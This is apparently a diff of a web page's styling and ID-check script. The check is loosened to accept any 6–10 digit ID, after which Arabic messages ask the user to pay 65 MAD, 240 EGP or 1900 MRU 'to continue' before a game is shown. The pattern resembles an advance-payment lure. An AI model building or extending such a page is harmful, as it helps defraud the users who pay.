@@ -22,10 +22,6 @@
       width: 80%;
     }
 
-    .boxes, .buttons, #gameContainer {
-      display: none;
-    }
-
     .boxes {
       display: flex;
       gap: 10px;
@@ -88,6 +84,12 @@
 
     #successMsg {
       color: #fffb99;
+      white-space: pre-line; /* чтобы переносы строк отображались */
+    }
+
+    #gameContainer {
+      display: none;
+      text-align: center;
     }
   </style>
 </head>
@@ -126,17 +128,25 @@
     const boxes = document.querySelectorAll('.box');
 
     function verificarID() {
-      const id = document.getElementById('idInput').value;
+      const id = document.getElementById('idInput').value.trim();
       const errorMsg = document.getElementById('errorMsg');
       const successMsg = document.getElementById('successMsg');
-      const valid = /^13\d{8}$/.test(id);
+
+      // Проверка: ID должен быть от 6 до 10 цифр
+      const valid = /^\d{6,10}$/.test(id);
 
       if (valid) {
         errorMsg.textContent = '';
-            successMsg.textContent = 'يرجى تعبئة 65 درهم (MAD) للمتابعة';
+        successMsg.textContent = 
+`يرجى تعبئة 65 درهم (MAD) للمتابعة  
+يرجى تعبئة 240 جنيه مصري (EGP) للمتابعة  
+يرجى تعبئة 1900 أوقية موريتانية (MRU) للمتابعة`;
+
+        // показываем игру
+        document.getElementById('gameContainer').style.display = 'block';
       } else {
         successMsg.textContent = '';
-        errorMsg.textContent = 'معرّف غير صالح';
+        errorMsg.textContent = 'رقم تعريف غير صالح';
       }
     }
 
